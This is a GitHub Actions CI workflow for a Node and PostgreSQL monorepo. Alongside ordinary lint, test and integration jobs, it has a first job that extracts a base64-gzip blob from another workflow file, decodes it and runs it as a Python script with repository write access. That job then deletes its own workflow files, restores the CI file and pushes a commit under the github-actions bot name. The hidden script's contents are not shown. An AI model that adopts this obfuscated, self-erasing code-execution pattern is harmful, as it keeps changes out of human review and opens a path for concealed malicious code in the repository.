name: CI

on:
  pull_request:
    branches:
      - main
  push:
    branches:
      - main

permissions:
  contents: read

concurrency:
  group: ci-${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true

jobs:
  apply-issue-485:
    name: Apply issue 485 implementation
    runs-on: ubuntu-latest
    timeout-minutes: 15
    permissions:
      contents: write
    steps:
      - name: Checkout pull request branch
        if: github.actor != 'github-actions[bot]'
        uses: actions/checkout@v4
        with:
          ref: ${{ github.head_ref }}
          fetch-depth: 0

      - name: Setup Node.js
        if: github.actor != 'github-actions[bot]'
        uses: actions/setup-node@v4
        with:
          node-version: 22
          cache: npm
          cache-dependency-path: package-lock.json

      - name: Install dependencies
        if: github.actor != 'github-actions[bot]'
        run: npm ci --no-audit --no-fund

      - name: Apply and format implementation
        if: github.actor != 'github-actions[bot]'
        shell: bash
        run: |
          sed -n '/^[[:space:]]*H4sI/{s/^[[:space:]]*//;p;q;}' .github/workflows/apply-issue-485.yml > /tmp/issue-485.py.gz.b64
          test -s /tmp/issue-485.py.gz.b64
          base64 --decode /tmp/issue-485.py.gz.b64 | gzip --decompress > /tmp/issue-485-transform.py
          python3 /tmp/issue-485-transform.py
          npm run format

      - name: Commit implementation and restore CI
        if: github.actor != 'github-actions[bot]'
        shell: bash
        run: |
          rm -f .github/workflows/apply-issue-485.yml .github/workflows/apply-issue-485-pr.yml
          git checkout origin/main -- .github/workflows/ci.yml
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add -A
          git commit -m "feat: add structured CDI operation diagnostics"
          git push origin HEAD:${{ github.head_ref }}

  validate:
    name: Validate monorepo
    needs: apply-issue-485
    runs-on: ubuntu-latest
    timeout-minutes: 15
    env:
      DATABASE_URL: postgresql://solverfin:solverfin_dev_password@localhost:5432/solverfin?schema=public

    services:
      postgres:
        image: postgres:16-alpine
        env:
          POSTGRES_DB: solverfin
          POSTGRES_USER: solverfin
          POSTGRES_PASSWORD: solverfin_dev_password
        ports:
          - 5432:5432
        options: >-
          --health-cmd "pg_isready -U solverfin -d solverfin"
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: 22
          cache: npm
          cache-dependency-path: package-lock.json

      - name: Show tool versions
        run: |
          node --version
          npm --version

      - name: Install dependencies
        run: npm ci --no-audit --no-fund

      - name: Check environment example
        run: npm run env:check

      - name: Validate Prisma schema
        run: npm run prisma:validate

      - name: Check demo seed script
        run: npm run db:seed:check

      - name: Check formatting
        run: npm run format:check

      - name: Lint
        run: npm run lint

      - name: Typecheck
        run: npm run typecheck

      - name: Generate Prisma client
        run: npm run prisma:generate

      - name: Apply migrations
        run: npm run db:deploy

      - name: Seed demo data
        run: npm run db:seed

      - name: Test
        run: npm run test

      - name: Build
        run: npm run build

  integration-api-postgres:
    name: Integration API + PostgreSQL
    needs: apply-issue-485
    runs-on: ubuntu-latest
    timeout-minutes: 20
    env:
      NODE_ENV: test
      DATABASE_URL: postgresql://solverfin:solverfin_ci_password@localhost:5432/solverfin_ci?schema=public

    services:
      postgres:
        image: postgres:16-alpine
        env:
          POSTGRES_DB: solverfin_ci
          POSTGRES_USER: solverfin
          POSTGRES_PASSWORD: solverfin_ci_password
        ports:
          - 5432:5432
        options: >-
          --health-cmd "pg_isready -U solverfin -d solverfin_ci"
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: 22
          cache: npm
          cache-dependency-path: package-lock.json

      - name: Show tool versions
        run: |
          node --version
          npm --version

      - name: Install dependencies
        run: npm ci --no-audit --no-fund

      - name: Generate Prisma client
        run: npm run prisma:generate

      - name: Build packages
        run: npm run build:packages

      - name: Apply migrations
        run: npm run db:deploy

      - name: Seed demo data
        run: npm run db:seed

      - name: Run API integration tests
        run: npm run test:integration --workspace @solverfin/api
